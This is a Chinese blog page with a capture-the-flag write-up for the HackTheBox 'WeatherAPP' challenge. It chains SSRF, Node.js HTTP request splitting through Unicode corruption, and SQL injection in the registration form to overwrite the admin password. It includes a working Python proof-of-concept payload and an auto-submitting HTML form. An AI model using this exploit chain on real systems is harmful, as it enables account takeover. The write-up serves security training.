@@ -1,0 +1,122 @@
+<!DOCTYPE html><html lang="en"><head><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description" content="懒"><meta name="theme-color" content="#2d4356"><meta name="baidu-site-verification"><title>HackTheBox WeatherAPP WriteUP | 忘返</title><link rel="stylesheet" type="text/css" href="/css/style.css"><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.png"><link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css"><script type="text/javascript" src="//cdn.jsdelivr.net/npm/jquery@3.4.1/dist/jquery.min.js"></script><meta name="generator" content="Hexo 6.3.0"></head><link rel="stylesheet" type="text/css" href="/plugins/highlight/atom-one-dark.min.css"><script type="text/javascript" src="/plugins/highlight/highlight.min.js"></script><script>hljs.initHighlightingOnLoad();
+</script><script type="text/javascript" src="/js/ready.js" async></script><link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css"><body class="night"><div class="mobile-head" id="mobile-head"><div class="navbar-icon"><span></span><span></span><span></span></div><div class="navbar-title"><a href="/">LITREILY</a></div><div class="navbar-search"><!--= show a circle here--></div></div><div class="h-wrapper" id="menu"><nav class="h-head box"><div class="m-hdimg"><a class="hdimg img" href="/"><img class="nofancybox" src="/img/profile.jpg" width="128" height="128"></a><h1 class="ttl"><a href="/">忘返</a></h1></div><p class="m-desc">且随我提灯照胆看江山。</p><div class="m-nav"><ul><li><span class="dot">●</span><a href="/archives/">归档</a></li><li><span class="dot">●</span><a href="/tags/">标签</a></li><li><span class="dot">●</span><a href="/about/">关于</a></li><li><span class="dot">●</span><a href="/links/">友链</a></li><li><span class="dot">●</span><a href="/Tips/">Tips</a></li><li class="m-sch"><form class="form" id="j-formsch" method="get"><input class="txt" type="text" id="local-search-input" name="q" value="搜索" onfocus="if(this.value=='搜索'){this.value='';}" onblur="if(this.value==''){this.value='搜索';}"><input type="text" style="display:none;"></form></li></ul><div id="local-search-result"></div></div></nav></div><div id="back2Top"><a class="fa fa-arrow-up" title="Back to top" href="#"></a></div><div class="box" id="container"><div class="l-wrapper"><div class="l-content box"><div class="l-post l-post-art"><article class="p-art"><div class="p-header box"><h1 class="p-title">HackTheBox WeatherAPP WriteUP</h1><div class="p-info"><span class="p-date"><i class="fa fa-calendar"></i><a href="/2023/08/22/HackTheBox-WeatherAPP-WriteUP/">2023-08-22</a></span><span class="p-view" id="busuanzi_container_page_pv"><i class="fa fa-eye"></i><span id="busuanzi_value_page_pv"></span></span></div></div><div class="p-content"><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><blockquote>
+<p>A pit of eternal darkness, a mindless journey of abeyance, this feels like a never-ending dream. I think I’m hallucinating with the memories of my past life, it’s a reflection of how thought I would have turned out if I had tried enough. A weatherman, I said! Someone my community would look up to, someone who is to be respected. I guess this is my way of telling you that I’ve been waiting for someone to come and save me. This weather application is notorious for trapping the souls of ambitious weathermen like me. Please defeat the evil bruxa that’s operating this website and set me free! 🧙‍♀️</p>
+</blockquote>
+<p><img src="/2023/08/22/HackTheBox-WeatherAPP-WriteUP/image.png" alt="WeatherAPP"></p>
+<p><img src="/2023/08/22/HackTheBox-WeatherAPP-WriteUP/image-1.png" alt="Web"></p>
+<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>首先看代码，代码给我们的线索有：</p>
+<ol>
+<li>Flag在<code>/app/flag</code>，需要以admin账户登录系统才能获得；</li>
+</ol>
+<p><img src="/2023/08/22/HackTheBox-WeatherAPP-WriteUP/image-2.png" alt="Flag File"></p>
+<ol start="2">
+<li>admin账号的密码是16进制32Byte大小的随机字符串，暴力破解不用考虑了；</li>
+</ol>
+<p><img src="/2023/08/22/HackTheBox-WeatherAPP-WriteUP/image-3.png" alt="32Pass"></p>
+<ol start="3">
+<li>注册账户功能存在SQL注入漏洞；</li>
+</ol>
+<p><img src="/2023/08/22/HackTheBox-WeatherAPP-WriteUP/image-4.png" alt="SQL Injection"></p>
+<ol start="4">
+<li>注册账户功能限制源IP，仅限本地（127.0.0.1）使用；</li>
+</ol>
+<p><img src="/2023/08/22/HackTheBox-WeatherAPP-WriteUP/image-6.png" alt="Register"></p>
+<ol start="5">
+<li>API<code>/api/weather</code>存在SSRF漏洞；</li>
+</ol>
+<p><img src="/2023/08/22/HackTheBox-WeatherAPP-WriteUP/image-5.png" alt="SSRF"></p>
+<p>至此，思路基本清晰，即：<strong>利用SSRF漏洞，让服务器提交注册用户请求，覆盖掉admin账号的密码，从而取得Flag。</strong></p>
+<p>唯一一个尚未解决的问题是，<code>/api/weather</code>接口只能提交GET请求，而注册用户是强制读取<code>Request Body</code>中的数据的。</p>
+<p>那么，我们还需要寻找其他线索。</p>
+<p><code>package.json</code>中显示，NodeJS版本为8.12.0</p>
+<p><img src="/2023/08/22/HackTheBox-WeatherAPP-WriteUP/image-7.png" alt="NodeJS"></p>
+<p>当前版本的NodeJS存在HTTP Request拆分漏洞，详见：<a target="_blank" rel="noopener" href="https://hackerone.com/reports/409943">Node.js disclosed on HackerOne: Http request splitting</a></p>
+<p>利用此漏洞，我们可以顺利通过服务器提交POST表单了。</p>
+<p>完整思路：</p>
+<ol>
+<li>利用SSRF伪造服务器请求；</li>
+<li>利用NodeJS组件漏洞提交POST表单；</li>
+<li>利用注册功能的SQL注入漏洞覆盖掉admin账户的密码；</li>
+<li>登录admin账户，获得Flag。</li>
+</ol>
+<h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><p>利用Python构造并提交POC：</p>
+<pre><code class="python"># poc.py
+
+import requests
+
+
+payload = &#39;&#39;&#39;127.0.0.1/ HTTP/1.1
+Host: http://127.0.0.1
+
+POST /register HTTP/1.1
+Host: http://127.0.0.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 88
+Connection: close
+
+username=admin&amp;password=1234&#39;) ON CONFLICT(username) DO UPDATE SET password = &#39;admin&#39;;--
+
+GET / HTTP/1.1
+Host: http://127.0.0.1
+test:&#39;&#39;&#39;.replace(&quot;\n&quot;,&quot;\r\n&quot;)
+
+payload = payload.replace(&#39;\r\n&#39;, &#39;\u010d\u010a&#39;) \
+    .replace(&#39;+&#39;, &#39;\u012b&#39;) \
+    .replace(&#39; &#39;, &#39;\u0120&#39;) \
+    .replace(&#39;&quot;&#39;, &#39;\u0122&#39;) \
+    .replace(&quot;&#39;&quot;, &#39;\u0a27&#39;) \
+    .replace(&#39;[&#39;, &#39;\u015b&#39;) \
+    .replace(&#39;]&#39;, &#39;\u015d&#39;) \
+    .replace(&#39;`&#39;, &#39;\u0127&#39;) \
+    .replace(&#39;&quot;&#39;, &#39;\u0122&#39;) \
+    .replace(&quot;&#39;&quot;, &#39;\u0a27&#39;) \
+    .replace(&#39;[&#39;, &#39;\u015b&#39;) \
+    .replace(&#39;]&#39;, &#39;\u015d&#39;)
+
+print(payload)
+
+burp0_url = &quot;http://167.172.61.89:32702/api/weather&quot;
+burp0_headers = &#123;&quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36&quot;, &quot;Accept&quot;: &quot;*/*&quot;, &quot;Accept-Language&quot;: &quot;en-US,en;q=0.5&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;Referer&quot;: &quot;http://167.172.61.89:32702/&quot;, &quot;Content-Type&quot;: &quot;application/json&quot;, &quot;Origin&quot;: &quot;http://167.172.61.89:32702&quot;, &quot;DNT&quot;: &quot;1&quot;, &quot;Connection&quot;: &quot;close&quot;, &quot;sec-ch-ua-platform&quot;: &quot;\&quot;Windows\&quot;&quot;, &quot;sec-ch-ua&quot;: &quot;\&quot;Google Chrome\&quot;;v=\&quot;113\&quot;, \&quot;Chromium\&quot;;v=\&quot;113\&quot;, \&quot;Not=A?Brand\&quot;;v=\&quot;24\&quot;&quot;, &quot;sec-ch-ua-mobile&quot;: &quot;?0&quot;&#125;
+burp0_json=&#123;&quot;city&quot;: &quot;Tokyo&quot;, &quot;country&quot;: &quot;JP&quot;, &quot;endpoint&quot;: payload&#125;
+resp = requests.post(burp0_url, headers=burp0_headers, json=burp0_json)
+
+print(resp.text)
+</code></pre>
+<p>登录admin，获得flag：</p>
+<p><img src="/2023/08/22/HackTheBox-WeatherAPP-WriteUP/image-8.png" alt="Bingo"></p>
+<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>最早解题的时候是没有注意到NodeJS的版本的，一直卡在无法提交POST表单这一步，最后还是看了其他大佬的WriteUP。想了一些很抽象的办法，例如在服务器上设置一个HTML文件，访问到这个文件的时候自动提交Form表单。这个思路能成功的前提是，服务器会解析HTML和JavaScript。抱着试一试的心态尝试了一番，最后理所当然的失败了。这里将用到的HTML代码记录下来，权当消遣与纪念(代码是ChatGPT写的)。</p>
+<pre><code class="HTML">&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
+    &lt;title&gt;自动提交表单&lt;/title&gt;
+    &lt;script type=&quot;text/javascript&quot;&gt;
+        window.onload = function() &#123;
+            document.forms[&quot;autoSubmitForm&quot;].submit();
+        &#125;
+    &lt;/script&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;form id=&quot;autoSubmitForm&quot; action=&quot;http://127.0.0.1/register&quot; method=&quot;post&quot;&gt;
+        &lt;input type=&quot;hidden&quot; name=&quot;username&quot; value=&quot;admin&quot;&gt;
+        &lt;input type=&quot;hidden&quot; name=&quot;password&quot; value=&quot;admin&quot;&gt;
+    &lt;/form&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
+<li><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/241429">NodeJS 中 Unicode 字符损坏导致的 HTTP 拆分攻击</a></li>
+<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/f_cccc/article/details/116406838">HTB之Weather App</a></li>
+</ul>
+</div><div class="p-copyright"><blockquote><div class="p-copyright-author"><span class="p-copyright-key">本文作者：</span><span class="p-copytight-value"><a href="mailto:litreily@163.com">忘返</a></span></div><div class="p-copyright-link"><span class="p-copyright-key">本文链接：</span><span class="p-copytight-value"><a href="/2023/08/22/HackTheBox-WeatherAPP-WriteUP/">https://7mitu.github.io/2023/08/22/HackTheBox-WeatherAPP-WriteUP/</a></span></div><div class="p-copyright-note"><span class="p-copyright-key">版权声明：</span><span class="p-copytight-value">本博客所有文章除特殊声明外，均采用<a rel="nofollow" target="_blank" href="https://creativecommons.org/licenses/by-nc/4.0/"> CC BY-NC 4.0 </a>许可协议。转载请注明出处 <a href="https://7mitu.github.io">忘返的博客</a>！</span></div></blockquote></div></article><div class="p-info box"></div><aside id="toc"><div class="toc-title">目录</div><nav><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE"><span class="toc-number">1.</span> <span class="toc-text">题目</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF"><span class="toc-number">2.</span> <span class="toc-text">思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98"><span class="toc-number">3.</span> <span class="toc-text">解题</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%8E%E8%AE%B0"><span class="toc-number">4.</span> <span class="toc-text">后记</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99"><span class="toc-number">5.</span> <span class="toc-text">参考资料</span></a></li></ol></nav></aside></div><section class="p-ext"><div class="l-pager l-pager-dtl box"><a class="next" href="/2023/08/22/HackTheBox-LoveTok-WriteUP/">HackTheBox LoveTok WriteUP &gt;</a></div></section><footer><p>Copyright © 2016 - 2023 <a href="/." rel="nofollow">忘返</a> | <strong><a rel="nofollow" target="_blank" href="https://creativecommons.org/licenses/by-nc/4.0/">CC BY-NC 4.0</a></strong><br><span id="busuanzi_container_site_uv"><i class="fa fa-user"></i><span id="busuanzi_value_site_uv"></span></span> <span id="busuanzi_container_site_pv"><i class="fa fa-eye"></i><span id="busuanzi_value_site_pv"></span></span> | Powered by<a rel="nofollow" target="_blank" href="https://hexo.io"> Hexo.</a>Theme with<a rel="nofollow" target="_blank" href="https://github.com/litreily/snark-hexo"> snark.</a></p></footer></div></div></div><script type="text/javascript" src="/js/search.js"></script><script type="text/javascript" src="/js/top.js"></script><script type="text/javascript" src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script><script>var search_path = 'search.xml';
+if (search_path.length == 0) {
+    search_path = 'search.xml';
+}
+var path = '/' + search_path;
+searchFunc(path, 'local-search-input', 'local-search-result');
+</script><script type="text/javascript" src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script><script type="text/javascript" src="/js/fancybox.js?v=0.0.1" async></script></body></html>
